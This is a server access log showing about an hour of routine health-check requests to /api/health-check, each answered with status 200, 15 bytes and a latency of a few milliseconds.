03:52:12.558 200 GET /api/health-check with 15 bytes took 3ms
03:52:42.809 200 GET /api/health-check with 15 bytes took 2ms
03:53:13.080 200 GET /api/health-check with 15 bytes took 3ms
03:53:43.306 200 GET /api/health-check with 15 bytes took 3ms
03:54:13.532 200 GET /api/health-check with 15 bytes took 2ms
03:54:43.760 200 GET /api/health-check with 15 bytes took 2ms
03:55:14.054 200 GET /api/health-check with 15 bytes took 3ms
03:55:44.293 200 GET /api/health-check with 15 bytes took 4ms
03:56:14.641 200 GET /api/health-check with 15 bytes took 2ms
03:56:44.873 200 GET /api/health-check with 15 bytes took 2ms
03:57:15.154 200 GET /api/health-check with 15 bytes took 5ms
03:57:45.439 200 GET /api/health-check with 15 bytes took 3ms
03:58:15.695 200 GET /api/health-check with 15 bytes took 1ms
03:58:45.935 200 GET /api/health-check with 15 bytes took 2ms
03:59:16.198 200 GET /api/health-check with 15 bytes took 1ms
03:59:46.478 200 GET /api/health-check with 15 bytes took 3ms
04:00:16.718 200 GET /api/health-check with 15 bytes took 1ms
04:00:46.978 200 GET /api/health-check with 15 bytes took 2ms
04:01:17.190 200 GET /api/health-check with 15 bytes took 1ms
04:01:47.474 200 GET /api/health-check with 15 bytes took 2ms
04:02:17.698 200 GET /api/health-check with 15 bytes took 2ms
04:02:47.955 200 GET /api/health-check with 15 bytes took 3ms
04:03:18.276 200 GET /api/health-check with 15 bytes took 1ms
04:03:48.494 200 GET /api/health-check with 15 bytes took 3ms
04:04:18.754 200 GET /api/health-check with 15 bytes took 2ms
04:04:49.030 200 GET /api/health-check with 15 bytes took 1ms
04:05:19.286 200 GET /api/health-check with 15 bytes took 2ms
04:05:49.537 200 GET /api/health-check with 15 bytes took 1ms
04:06:19.795 200 GET /api/health-check with 15 bytes took 3ms
04:06:50.007 200 GET /api/health-check with 15 bytes took 1ms
04:07:20.324 200 GET /api/health-check with 15 bytes took 2ms
04:07:50.578 200 GET /api/health-check with 15 bytes took 2ms
04:08:20.915 200 GET /api/health-check with 15 bytes took 2ms
04:08:51.175 200 GET /api/health-check with 15 bytes took 3ms
04:09:21.407 200 GET /api/health-check with 15 bytes took 2ms
04:09:51.667 200 GET /api/health-check with 15 bytes took 2ms
04:10:21.907 200 GET /api/health-check with 15 bytes took 1ms
04:10:52.181 200 GET /api/health-check with 15 bytes took 3ms
04:11:22.415 200 GET /api/health-check with 15 bytes took 2ms
04:11:52.711 200 GET /api/health-check with 15 bytes took 4ms
04:12:23.021 200 GET /api/health-check with 15 bytes took 2ms
04:12:53.282 200 GET /api/health-check with 15 bytes took 3ms
04:13:23.522 200 GET /api/health-check with 15 bytes took 2ms
04:13:53.742 200 GET /api/health-check with 15 bytes took 2ms
04:14:23.987 200 GET /api/health-check with 15 bytes took 2ms
04:14:54.291 200 GET /api/health-check with 15 bytes took 3ms
04:15:24.539 200 GET /api/health-check with 15 bytes took 2ms
04:15:54.818 200 GET /api/health-check with 15 bytes took 2ms
04:16:25.067 200 GET /api/health-check with 15 bytes took 2ms
04:16:55.313 200 GET /api/health-check with 15 bytes took 1ms
04:17:25.565 200 GET /api/health-check with 15 bytes took 4ms
04:17:55.810 200 GET /api/health-check with 15 bytes took 1ms
04:18:26.079 200 GET /api/health-check with 15 bytes took 3ms
04:18:56.336 200 GET /api/health-check with 15 bytes took 3ms
04:19:26.574 200 GET /api/health-check with 15 bytes took 2ms
04:19:56.853 200 GET /api/health-check with 15 bytes took 7ms
04:20:27.173 200 GET /api/health-check with 15 bytes took 3ms
04:20:57.398 200 GET /api/health-check with 15 bytes took 2ms
04:21:27.676 200 GET /api/health-check with 15 bytes took 2ms
04:21:57.925 200 GET /api/health-check with 15 bytes took 2ms
04:22:28.219 200 GET /api/health-check with 15 bytes took 2ms
04:22:58.484 200 GET /api/health-check with 15 bytes took 9ms
04:23:28.758 200 GET /api/health-check with 15 bytes took 1ms
04:23:59.001 200 GET /api/health-check with 15 bytes took 3ms
04:24:29.292 200 GET /api/health-check with 15 bytes took 2ms
04:24:59.579 200 GET /api/health-check with 15 bytes took 3ms
04:25:29.851 200 GET /api/health-check with 15 bytes took 2ms
04:26:00.144 200 GET /api/health-check with 15 bytes took 4ms
04:26:30.411 200 GET /api/health-check with 15 bytes took 2ms
04:27:00.667 200 GET /api/health-check with 15 bytes took 1ms
04:27:30.891 200 GET /api/health-check with 15 bytes took 3ms
04:28:01.136 200 GET /api/health-check with 15 bytes took 3ms
04:28:31.440 200 GET /api/health-check with 15 bytes took 2ms
04:29:01.704 200 GET /api/health-check with 15 bytes took 4ms
04:29:31.950 200 GET /api/health-check with 15 bytes took 2ms
04:30:02.324 200 GET /api/health-check with 15 bytes took 2ms
04:30:32.585 200 GET /api/health-check with 15 bytes took 3ms
04:31:02.827 200 GET /api/health-check with 15 bytes took 3ms
04:31:33.105 200 GET /api/health-check with 15 bytes took 2ms
04:32:03.399 200 GET /api/health-check with 15 bytes took 7ms
04:32:33.698 200 GET /api/health-check with 15 bytes took 4ms
04:33:03.951 200 GET /api/health-check with 15 bytes took 2ms
04:33:34.295 200 GET /api/health-check with 15 bytes took 2ms
04:34:04.553 200 GET /api/health-check with 15 bytes took 2ms
04:34:34.775 200 GET /api/health-check with 15 bytes took 1ms
04:35:05.054 200 GET /api/health-check with 15 bytes took 1ms
04:35:35.315 200 GET /api/health-check with 15 bytes took 2ms
04:36:05.567 200 GET /api/health-check with 15 bytes took 2ms
04:36:35.834 200 GET /api/health-check with 15 bytes took 2ms
04:37:06.082 200 GET /api/health-check with 15 bytes took 2ms
04:37:36.334 200 GET /api/health-check with 15 bytes took 2ms
04:38:06.565 200 GET /api/health-check with 15 bytes took 2ms
04:38:36.835 200 GET /api/health-check with 15 bytes took 1ms
04:39:07.135 200 GET /api/health-check with 15 bytes took 2ms
04:39:37.379 200 GET /api/health-check with 15 bytes took 2ms
04:40:07.627 200 GET /api/health-check with 15 bytes took 2ms
04:40:37.877 200 GET /api/health-check with 15 bytes took 2ms
04:41:08.107 200 GET /api/health-check with 15 bytes took 1ms
04:41:38.376 200 GET /api/health-check with 15 bytes took 1ms
04:42:08.607 200 GET /api/health-check with 15 bytes took 4ms
04:42:38.883 200 GET /api/health-check with 15 bytes took 2ms
04:43:09.112 200 GET /api/health-check with 15 bytes took 2ms
04:43:39.443 200 GET /api/health-check with 15 bytes took 3ms
04:44:09.660 200 GET /api/health-check with 15 bytes took 3ms
04:44:39.956 200 GET /api/health-check with 15 bytes took 2ms
04:45:10.262 200 GET /api/health-check with 15 bytes took 4ms
04:45:40.599 200 GET /api/health-check with 15 bytes took 3ms
04:46:10.850 200 GET /api/health-check with 15 bytes took 3ms
04:46:41.137 200 GET /api/health-check with 15 bytes took 1ms
04:47:11.384 200 GET /api/health-check with 15 bytes took 3ms
04:47:41.670 200 GET /api/health-check with 15 bytes took 2ms
04:48:11.922 200 GET /api/health-check with 15 bytes took 2ms
04:48:42.185 200 GET /api/health-check with 15 bytes took 2ms
04:49:12.482 200 GET /api/health-check with 15 bytes took 5ms
04:49:42.727 200 GET /api/health-check with 15 bytes took 1ms
04:50:13.000 200 GET /api/health-check with 15 bytes took 8ms
04:50:43.290 200 GET /api/health-check with 15 bytes took 3ms
04:51:13.551 200 GET /api/health-check with 15 bytes took 1ms
04:51:43.786 200 GET /api/health-check with 15 bytes took 3ms
04:52:14.026 200 GET /api/health-check with 15 bytes took 3ms
04:52:44.251 200 GET /api/health-check with 15 bytes took 2ms
04:53:14.486 200 GET /api/health-check with 15 bytes took 2ms
04:53:44.745 200 GET /api/health-check with 15 bytes took 4ms
04:54:15.012 200 GET /api/health-check with 15 bytes took 3ms
04:54:45.228 200 GET /api/health-check with 15 bytes took 3ms
04:55:15.519 200 GET /api/health-check with 15 bytes took 2ms
04:55:45.770 200 GET /api/health-check with 15 bytes took 2ms
04:56:16.033 200 GET /api/health-check with 15 bytes took 8ms
04:56:46.291 200 GET /api/health-check with 15 bytes took 3ms
04:57:16.508 200 GET /api/health-check with 15 bytes took 1ms
04:57:46.816 200 GET /api/health-check with 15 bytes took 2ms
04:58:17.077 200 GET /api/health-check with 15 bytes took 3ms
04:58:47.334 200 GET /api/health-check with 15 bytes took 1ms
